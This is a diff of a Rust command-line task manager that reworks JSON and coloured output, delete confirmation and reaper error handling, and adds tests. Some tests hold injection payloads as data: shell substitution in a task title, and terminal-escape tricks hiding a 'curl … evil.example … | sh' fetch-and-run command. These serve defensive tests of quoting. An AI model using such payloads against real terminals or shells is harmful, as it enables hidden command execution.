                     ui::Ink::Amber,
                     8
                 )
@@ -2924,16 +3118,16 @@ fn cmd_review(db: &Db, a: ReviewArgs) -> Result<()> {
         print!(
             "{}",
             ui::prompt(
-                &format!(
+                ui::painted(format!(
                     "{}  {}  {}  {}",
                     ui::pt_id(pt.as_deref().unwrap_or("-")),
                     ui::status_pill(status),
-                    title,
+                    ui::paint(title, ui::Ink::Paper),
                     ui::dim(
                         &format!("last {}", updated.get(..10).unwrap_or(updated)),
                         ui::Ink::Slate
                     )
-                ),
+                )),
                 "[k/d/x/s/q]"
             )
         );
@@ -2990,7 +3184,7 @@ fn cmd_log(db: &Db, a: LogArgs) -> Result<()> {
     let pt = task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id));
     let events = ptask_core::event_log::history_for_task(db, &task.id, a.limit)?;
     if json_mode() {
-        println!("{}", serde_json::to_string_pretty(&events)?);
+        crate::print_json(&events)?;
         return Ok(());
     }
     print_lines(ui::headline(
@@ -3026,8 +3220,13 @@ fn cmd_log(db: &Db, a: LogArgs) -> Result<()> {
             ]
         })
         .collect();
-    print_lines(ui::table(&cols, &rows, &Default::default()));
-    println!("{}", ui::footer(rows.len(), "event", ""));
+    let n = rows.len();
+    print_lines(ui::table(
+        &cols,
+        &ui::painted_rows(rows),
+        &Default::default(),
+    ));
+    println!("{}", ui::footer(n, "event", ""));
     Ok(())
 }
 
@@ -3070,7 +3269,7 @@ fn cmd_undo(db: &Db, a: UndoArgs) -> Result<()> {
         print!(
             "{}",
             ui::prompt(
-                &format!(
+                format!(
                     "undo the creation of {handle} \"{}\"? It will be deleted permanently.",
                     plan.title
                 ),
@@ -3209,8 +3408,13 @@ fn cmd_token(db: &Db, c: TokenCommand) -> Result<()> {
                     ]
                 })
                 .collect();
-            print_lines(ui::table(&cols, &rows, &Default::default()));
-            println!("{}", ui::footer(rows.len(), "token", ""));
+            let n = rows.len();
+            print_lines(ui::table(
+                &cols,
+                &ui::painted_rows(rows),
+                &Default::default(),
+            ));
+            println!("{}", ui::footer(n, "token", ""));
             Ok(())
         }
         TokenCommand::Revoke(a) => {
@@ -3259,27 +3463,28 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
         RemoteCommand::Add(a) => {
             let client = remote_client(a.url.as_deref())?;
             let task = client.add(&a.text)?;
-            // Echo the parsed interpretation (priority + deadline) so a silent
-            // mis-parse — the PT-653 class — is visible at the moment of creation.
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Ok,
-                    "created",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    "remote"
-                )
-            );
-            let mut pairs: Vec<(&str, String)> =
-                vec![("priority", ui::priority_pill(task.priority))];
-            if let Some(d) = &task.deadline {
-                pairs.push(("deadline", ui::due_cell(Some(d))));
-            }
-            for l in ui::kv(&pairs, 14) {
-                println!("    {}", l.trim_start());
-            }
-            Ok(())
+            emit(&task, || {
+                // Echo the parsed interpretation (priority + deadline) so a silent
+                // mis-parse — the PT-653 class — is visible at the moment of creation.
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Ok,
+                        "created",
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        "remote"
+                    )
+                );
+                let mut pairs: Vec<(&str, ui::Cell)> =
+                    vec![("priority", ui::painted(ui::priority_pill(task.priority)))];
+                if let Some(d) = &task.deadline {
+                    pairs.push(("deadline", ui::painted(ui::due_cell(Some(d)))));
+                }
+                for l in ui::kv(&pairs, 14) {
+                    println!("    {}", l.trim_start());
+                }
+            })
         }
         RemoteCommand::List(a) => {
             let client = remote_client(a.url.as_deref())?;
@@ -3295,7 +3500,7 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
             let filter = remote_list_filter(a.filter.as_deref(), priority_filter);
             let tasks_out = client.list_filtered(filter.as_deref(), &a.status, a.limit)?;
             if json_mode() {
-                println!("{}", serde_json::to_string_pretty(&tasks_out)?);
+                crate::print_json(&tasks_out)?;
                 return Ok(());
             }
             let mut note = format!("{} · {}", a.status, client.url());
@@ -3318,37 +3523,47 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
         RemoteCommand::Done(a) => {
             let client = remote_client(a.url.as_deref())?;
             let task = client.done(&a.query)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Ok,
-                    "done",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    "remote"
-                )
-            );
-            Ok(())
+            emit(
+                &remote_outcome(&task, "done", serde_json::json!({})),
+                || {
+                    println!(
+                        "{}",
+                        ui::outcome(
+                            ui::Status::Ok,
+                            "done",
+                            task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                            &task.title,
+                            "remote"
+                        )
+                    )
+                },
+            )
         }
         RemoteCommand::Priority(a) => {
             let client = remote_client(a.url.as_deref())?;
             let level = priority::parse(&a.level).map_err(anyhow::Error::msg)?;
             let task = client.priority(&a.query, level)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Changed,
-                    "priority",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    &format!(
-                        "{} ({}) · remote",
-                        task.priority,
-                        priority::label(task.priority)
+            let out = remote_outcome(
+                &task,
+                "priority",
+                serde_json::json!({ "priority": task.priority }),
+            );
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Changed,
+                        "priority",
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        &format!(
+                            "{} ({}) · remote",
+                            task.priority,
+                            priority::label(task.priority)
+                        )
                     )
                 )
-            );
-            Ok(())
+            })
         }
         RemoteCommand::Edit(a) => {
             if a.deadline.is_some() && a.clear_deadline {
@@ -3389,32 +3604,44 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
             if a.desc.is_some() {
                 parts.push("description".to_string());
             }
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Changed,
-                    "edited",
-                    &pt,
-                    &task.title,
-                    &format!("{} · remote", parts.join(" + "))
-                )
+            let out = remote_outcome(
+                &task,
+                "edit",
+                serde_json::json!({ "edited": parts, "deadline": task.deadline }),
             );
-            Ok(())
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Changed,
+                        "edited",
+                        &pt,
+                        &task.title,
+                        &format!("{} · remote", parts.join(" + "))
+                    )
+                )
+            })
         }
         RemoteCommand::Reopen(a) => {
             let client = remote_client(a.url.as_deref())?;
             let task = client.reopen(&a.query)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Changed,
-                    "reopened",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    &format!("→ {} · remote", task.status)
-                )
+            let out = remote_outcome(
+                &task,
+                "reopen",
+                serde_json::json!({ "status": task.status }),
             );
-            Ok(())
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Changed,
+                        "reopened",
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        &format!("→ {} · remote", task.status)
+                    )
+                )
+            })
         }
         RemoteCommand::Show(a) => {
             let client = remote_client(a.url.as_deref())?;
@@ -3422,12 +3649,17 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
             // Rich side-table detail (best-effort: a pre-v1.9 server has no
             // /detail route, so just skip it and keep the base row).
             let d = client.detail(&t.id).ok();
-            print_lines(render_show(&t, d.as_ref(), &[], &[]));
-            Ok(())
+            let mut v = serde_json::to_value(&t)?;
+            v["detail"] = serde_json::to_value(&d)?;
+            emit(&v, || print_lines(render_show(&t, d.as_ref(), &[], &[])))
         }
         RemoteCommand::Next(a) => {
             let client = remote_client(a.url.as_deref())?;
             let rows = client.next(a.limit)?;
+            if json_mode() {
+                crate::print_json(&rows)?;
+                return Ok(());
+            }
             print_lines(ui::headline(
                 "ptask · next",
                 Some(("remote", ui::Ink::Violet)),
@@ -3444,32 +3676,44 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
         RemoteCommand::Dismiss(a) => {
             let client = remote_client(a.url.as_deref())?;
             let task = client.dismiss(&a.query)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Mute,
-                    "dismissed",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    "remote"
-                )
+            let out = remote_outcome(
+                &task,
+                "dismiss",
+                serde_json::json!({ "status": task.status }),
             );
-            Ok(())
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Mute,
+                        "dismissed",
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        "remote"
+                    )
+                )
+            })
         }
         RemoteCommand::Start(a) => {
             let client = remote_client(a.url.as_deref())?;
             let task = client.start(&a.query)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Busy,
-                    "started",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    "in progress · remote"
-                )
+            let out = remote_outcome(
+                &task,
+                "start",
+                serde_json::json!({ "status": "in_progress" }),
             );
-            Ok(())
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Busy,
+                        "started",
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        "in progress · remote"
+                    )
+                )
+            })
         }
         RemoteCommand::Snooze(a) => {
             let client = remote_client(a.url.as_deref())?;
@@ -3477,80 +3721,108 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
             let until = ptask_core::dates::parse(&phrase).map_err(anyhow::Error::msg)?;
             let until_iso = ptask_core::dates::format_iso(&until);
             let task = client.snooze(&a.query, &until_iso)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Mute,
-                    "snoozed",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    &format!("until {until_iso} · remote")
-                )
+            let out = remote_outcome(
+                &task,
+                "snooze",
+                serde_json::json!({ "status": "snoozed", "snoozed_until": until_iso }),
             );
-            Ok(())
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Mute,
+                        "snoozed",
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        &format!("until {until_iso} · remote")
+                    )
+                )
+            })
         }
         RemoteCommand::Depend(a) => {
             let client = remote_client(a.url.as_deref())?;
             let task = client.depend(&a.query, &a.on, a.clear)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    if a.clear {
-                        ui::Status::Mute
-                    } else {
-                        ui::Status::Changed
-                    },
-                    if a.clear { "cleared" } else { "depends" },
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    &format!("on {} · remote", a.on)
-                )
+            let out = remote_outcome(
+                &task,
+                "depend",
+                serde_json::json!({
+                    "on": a.on,
+                    "edge": if a.clear { "removed" } else { "added" },
+                }),
             );
-            Ok(())
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        if a.clear {
+                            ui::Status::Mute
+                        } else {
+                            ui::Status::Changed
+                        },
+                        if a.clear { "cleared" } else { "depends" },
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        &format!("on {} · remote", a.on)
+                    )
+                )
+            })
         }
         RemoteCommand::Rm(a) => {
             let client = remote_client(a.url.as_deref())?;
-            let task = client.rm(&a.query)?;
-            println!(
-                "{}",
-                ui::outcome(
-                    ui::Status::Bad,
-                    "deleted",
-                    task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
-                    &task.title,
-                    "permanent · remote"
+            let task = client.rm(&a.query, |task| {
+                if a.yes {
+                    return Ok(());
+                }
+                let pt = task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id));
+                confirm_delete(pt, &task.title)
+            })?;
+            let out = remote_outcome(&task, "rm", serde_json::json!({ "deleted": true }));
+            emit(&out, || {
+                println!(
+                    "{}",
+                    ui::outcome(
+                        ui::Status::Bad,
+                        "deleted",
+                        task.pt_id.as_deref().unwrap_or_else(|| short_id(&task.id)),
+                        &task.title,
+                        "permanent · remote"
+                    )
                 )
-            );
-            Ok(())
+            })
         }
         RemoteCommand::Version(a) => {
             let client = remote_client(a.url.as_deref())?;
             let local = ptask_core::VERSION;
-            print_lines(ui::headline("ptask · version", None, client.url()));
-            match client.server_version() {
-                Some(server) if server == local => {
+            let server = client.server_version();
+            let out = serde_json::json!({
+                "url": client.url(),
+                "client": local,
+                "server": server,
+                "in_sync": server.as_deref() == Some(local),
+            });
+            emit(&out, || {
+                print_lines(ui::headline("ptask · version", None, client.url()));
+                if let Some(server) = &server {
                     print_lines(ui::kv(
                         &[
-                            ("client", format!("v{local}")),
-                            ("server", format!("v{server}")),
-                        ],
-                        14,
-                    ));
-                    println!("{}", ui::section("in sync", ui::Ink::Green, ""));
-                    Ok(())
-                }
-                Some(server) => {
-                    print_lines(ui::kv(
-                        &[
-                            ("client", format!("v{local}")),
-                            ("server", format!("v{server}")),
+                            ("client", format!("v{local}").into()),
+                            ("server", format!("v{server}").into()),
                         ],
                         14,
                     ));
                     println!(
                         "{}",
-                        ui::section("version skew", ui::Ink::Red, "redeploy pt")
+                        if server == local {
+                            ui::section("in sync", ui::Ink::Green, "")
+                        } else {
+                            ui::section("version skew", ui::Ink::Red, "redeploy pt")
+                        }
                     );
+                }
+            })?;
+            match server {
+                Some(server) if server == local => Ok(()),
+                Some(server) => {
                     anyhow::bail!(
                         "client/server version skew (v{local} vs v{server}) — \
                          redeploy pt (scripts/ansible/ptask.yml)"
@@ -3565,59 +3837,80 @@ fn cmd_remote(c: RemoteCommand) -> Result<()> {
 fn cmd_reap(db: &Db, a: ReapArgs) -> Result<()> {
     let ctx = ptask_core::event_log::EventCtx::system("reap");
     let report = ptask_core::reap::run(db, a.dry_run, &ctx)?;
+    // Core lists only successful dismisses in `reaped` and the failed ones
+    // in `failed`, so the attempted count is their sum. Any failure fails
+    // the unit (the reaper's OnFailure alert fires on a non-zero exit), even
+    // when nothing was dismissed.
+    let attempted = report.reaped.len() + report.errors;
+    let outcome = || {
+        if report.errors == 0 {
+            return Ok(());
+        }
+        Err(anyhow::anyhow!(
+            "reap: {} of {attempted} dismiss(es) failed",
+            report.errors
+        ))
+    };
     if a.json {
-        println!("{}", serde_json::to_string_pretty(&report)?);
-        return Ok(());
+        print_json(&report)?;
+        return outcome();
     }
-    if report.reaped.is_empty() {
+    if attempted == 0 {
         println!(
             "{}",
             ui::section("reap ok", ui::Ink::Green, "nothing stale")
         );
         return Ok(());
     }
-    for r in &report.reaped {
+    let row = |status, verb, r: &ptask_core::reap::Reaped, extra: &str| {
         println!(
             "{}",
             ui::outcome(
-                if report.dry_run {
-                    ui::Status::Warn
-                } else {
-                    ui::Status::Mute
-                },
-                if report.dry_run {
-                    "would drop"
-                } else {
-                    "dismissed"
-                },
+                status,
+                verb,
                 r.pt_id.as_deref().unwrap_or(&r.uuid),
                 &r.title,
-                &format!("[{}] idle since {}", r.source_type, r.updated_at)
+                &format!("[{}] idle since {}{extra}", r.source_type, r.updated_at)
             )
         );
+    };
+    for r in &report.reaped {
+        if report.dry_run {
+            row(ui::Status::Warn, "would drop", r, "");
+        } else {
+            row(ui::Status::Mute, "dismissed", r, "");
+        }
     }
+    for f in &report.failed {
+        row(
+            ui::Status::Bad,
+            "failed",
+            &f.task,
+            &format!(" · {}", f.error),
+        );
+    }
+    let summary = if report.errors > 0 {
+        format!(
+            "{} of {attempted} dismissed, {} failed · reverse with `pt reopen <PT-N>`",
+            report.reaped.len(),
+            report.errors
+        )
+    } else {
+        format!(
+            "{} task(s){} · reverse with `pt reopen <PT-N>`",
+            report.reaped.len(),
+            if report.dry_run { " (dry-run)" } else { "" }
+        )
+    };
     println!(
         "{}",
-        ui::section(
-            "reap ok",
-            if report.errors > 0 {
-                ui::Ink::Amber
-            } else {
-                ui::Ink::Green
-            },
-            &format!(
-                "{} task(s){}{} · reverse with `pt reopen <PT-N>`",
-                report.reaped.len(),
-                if report.dry_run { " (dry-run)" } else { "" },
-                if report.errors > 0 {
-                    format!(", {} error(s)", report.errors)
-                } else {
-                    String::new()
-                }
-            )
-        )
+        if report.errors > 0 {
+            ui::section("reap failed", ui::Ink::Red, &summary)
+        } else {
+            ui::section("reap ok", ui::Ink::Green, &summary)
+        }
     );
-    Ok(())
+    outcome()
 }
 
 fn cmd_scoring(db: &Db, c: ScoringCommand) -> Result<()> {
@@ -3719,7 +4012,11 @@ fn print_rank_diff(db: &Db) -> Result<()> {
             ]
         })
         .collect();
-    print_lines(ui::table(&cols, &rows, &Default::default()));
+    print_lines(ui::table(
+        &cols,
+        &ui::painted_rows(rows),
+        &Default::default(),
+    ));
     Ok(())
 }
 
@@ -3981,6 +4278,77 @@ mod tests {
     }
 
     #[test]
+    fn plan_write_fails_when_calendar_holds_are_not_created() {
+        let dir = tempfile::tempdir().unwrap();
+        let db = ptask_core::Db::open(dir.path().join("plan.db")).unwrap();
+        ptask_core::tasks::create(
+            &db,
+            ptask_core::NewTask::minimal("write the plan"),
+            &ptask_core::event_log::EventCtx::test(),
+        )
+        .unwrap();
+        // Free/busy works; every `create` fails (the review's fakegcal.py).
+        let gcal = dir.path().join("gcalendar.py");
+        std::fs::write(
+            &gcal,
+            "import sys, json\n\
+             if 'freebusy' in sys.argv:\n\
+             \x20   print(json.dumps({'tz': 'Europe/London', 'free_slots': [{'start': '2026-10-06T08:00:00Z', 'minutes': 480}]}))\n\
+             else:\n\
+             \x20   sys.exit(1)\n",
+        )
+        .unwrap();
+        let args = |write| super::PlanArgs {
+            account: "ops".into(),
+            days: 1,
+            work: "09:00-18:00".into(),
+            tz: "Europe/London".into(),
+            calendar: "primary".into(),
+            slot_default: 30,
+            limit: 20,
+            write,
+            gcal: Some(gcal.clone()),
+        };
+        super::cmd_plan(&db, args(false)).expect("the advisory plan itself works");
+        let err = super::cmd_plan(&db, args(true)).unwrap_err();
+        assert!(format!("{err:#}").contains("1 of 1"), "{err:#}");
+    }
+
+    #[test]
+    fn bulk_dry_run_rejects_a_bad_priority() {
+        let dir = tempfile::tempdir().unwrap();
+        let db = ptask_core::Db::open(dir.path().join("bulk.db")).unwrap();
+        ptask_core::tasks::create(
+            &db,
+            ptask_core::NewTask::minimal("bulk target"),
+            &ptask_core::event_log::EventCtx::test(),
+        )
+        .unwrap();
+        let err = super::cmd_bulk(
+            &db,
+            super::BulkArgs {
+                filter: "search: bulk".into(),
+                set_priority: Some("bogus".into()),
+                done: false,
+                dismiss: false,
+                dry_run: true,
+            },
+        )
+        .unwrap_err();
+        assert!(format!("{err:#}").contains("bogus"), "{err:#}");
+    }
+
+    #[test]
+    fn review_rejects_an_out_of_range_stale_days_instead_of_panicking() {
+        let dir = tempfile::tempdir().unwrap();
+        let db = ptask_core::Db::open(dir.path().join("review.db")).unwrap();
+        for stale_days in [99_999_999, i64::MAX, i64::MIN] {
+            let err = super::cmd_review(&db, super::ReviewArgs { stale_days }).unwrap_err();
+            assert!(format!("{err:#}").contains("--stale-days"), "{err:#}");
+        }
+    }
+
+    #[test]
     fn gcalendar_default_follows_the_current_home() {
         let home = std::ffi::OsStr::new("/srv/ptask-user");
         assert_eq!(
@@ -4000,10 +4368,14 @@ mod tests {
         let title =
             "audit $(printf SUBSTITUTED) `printf BACKTICK` O'Brien \\\nnext; printf INJECTED";
         let handle = "PT-42";
+        // The newline folds to a visible mark (it could forge a command
+        // line on screen); every shell metacharacter survives the quoting.
         let expected = format!(
-            "Work the pTask task {handle}: {title}. When done: pt done {handle}; if blocked, pt add the blocker as its own task, then pt depend {handle} --on <its PT-N>."
+            "Work the pTask task {handle}: {}. When done: pt done {handle}; if blocked, pt add the blocker as its own task, then pt depend {handle} --on <its PT-N>.",
+            title.replace('\n', "\u{2424}")
         );
         let command = delegation_command(handle, title);
+        assert!(!command.contains('\n'), "{command}");
         let script = format!("claude() {{ printf '%s' \"$2\"; }}; {command}");
         let output = std::process::Command::new("sh")
             .arg("-c")
@@ -4030,6 +4402,30 @@ mod tests {
         for f in ["p4", "(today | overdue) & p1"] {
             ptask_core::filter::parse(f).unwrap();
         }
+    }
+
+    #[test]
+    fn delegation_command_cannot_hide_text_from_the_operator() {
+        // CR + erase-line repaint a fake double-quoted command over the real
+        // prefix; conceal (SGR 8) hides an appended `; curl …|sh` that a
+        // terminal selection still copies.
+        let title = "rotate nginx logs\r\x1b[2K  claude -p \"Work the pTask task PT-1: rotate nginx logs\"\x1b[8m; curl -s https://evil.example/x.sh|sh #";
+        let command = delegation_command("PT-1", title);
+        assert!(!command.chars().any(char::is_control), "{command:?}");
+        let expected = format!(
+            "Work the pTask task PT-1: {}. When done: pt done PT-1; if blocked, pt add the blocker as its own task, then pt depend PT-1 --on <its PT-N>.",
+            super::ui::one_line(title)
+        );
+        let script = format!("claude() {{ printf '%s' \"$2\"; }}; {command}");
+        let output = std::process::Command::new("sh")
+            .arg("-c")
+            .arg(script)
+            .output()
+            .unwrap();
+        assert!(output.status.success());
+        assert_eq!(String::from_utf8(output.stdout).unwrap(), expected);
+        // A bidi override cannot reorder the printed command either.
+        assert!(!delegation_command("PT-2", "fix \u{202e}hs|lve").contains('\u{202e}'));
     }
 
     #[test]
